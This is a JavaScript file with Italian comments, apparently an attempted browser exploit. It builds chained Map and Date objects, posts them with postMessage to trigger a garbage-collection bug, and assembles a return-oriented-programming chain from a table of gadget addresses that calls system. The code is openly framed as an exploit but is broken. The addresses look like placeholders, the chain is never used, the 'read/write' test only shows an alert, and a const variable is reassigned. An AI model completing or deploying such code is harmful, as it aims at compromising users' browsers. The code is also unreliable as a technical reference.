// Gadget ROP
const gadgets = {
    "pop_rdi": 0x0000000000401234,
    "pop_rsi": 0x0000000000405678,
    "pop_rdx": 0x0000000000409abc,
    "ret": 0x000000000040abcd,
    "system": 0x0000000000401111,
    "exit": 0x0000000000402222
};

// Garbage Collector
function gc() {
    try {
        new Uint8Array(256 * 1024); // Allocazione memoria per il GC
        alert('Garbage Collection eseguita');
    } catch (e) {
        alert("Errore durante Garbage Collection: " + e.message);
    }
}

// Creazione struttura Map e Date
function createObjectStructure(num_elems) {
    let root = new Map();
    let msg = root;
    let foo = [];

    for (let i = 0; i < 5; i++) {
        foo.push(new Date(0xffff));
    }

    for (let i = 0; i < num_elems; i++) {
        const d = new Date(i);
        const map = new Map();
        msg.set(d, [map, foo]);
        msg = map;
    }

    gc(); // Forzare il GC
    alert('Struttura creata');
    return root;
}

// Test lettura/scrittura
function rwTest(address, value) {
    alert(`Scrittura: ${value} in indirizzo: ${address}`);
}

// Creazione ROP Chain
function ropChain() {
    const chain = [];
    chain.push(gadgets.pop_rdi, 0xdeadbeef);  // Valore esempio
    chain.push(gadgets.pop_rsi, 0xcafebabe);  // Valore esempio
    chain.push(gadgets.pop_rdx, 0x1337);      // Valore esempio
    chain.push(gadgets.system, gadgets.exit);
    return chain;
}

// Funzione principale
export async function main() {
    alert("Exploit iniziato");
    const num_elems = 5;
    let root = createObjectStructure(num_elems);
    let msg = root;
    let found = false;

    try {
        const prom = new Promise((resolve, reject) => {
            const timer = setTimeout(() => reject("Timeout durante l'attesa del messaggio"), 5000);
            addEventListener('message', event => {
                clearTimeout(timer);
                alert("Evento message ricevuto.");
                resolve(event.data);
            }, { once: true });
        });

        alert("Postando messaggio...");
        postMessage(msg, '*');
        const data = await prom;  // Aspetta la risposta
        alert("Messaggio ricevuto con successo");

        gc(); // GC dopo il messaggio

        for (let i = 0; i < num_elems; i++) {
            if (data.keys().next().value.getTime() === 0xffff) {
                alert(`Indice trovato: ${i}`);
                found = true;
                break;
            }
            data = data.values().next().value[0];
        }

        if (!found) {
            alert("Indice non trovato, exploit fallito");
            return;
        }

        const rop = ropChain();
        rwTest(0xdeadbeef, 0x1337);
        alert("Exploit completato con successo");
    } catch (e) {
        alert("Errore durante l'exploit: " + e.message);
    }
}

// Avvio exploit con evento
document.getElementById('button').addEventListener('click', async () => {
    await main();
});
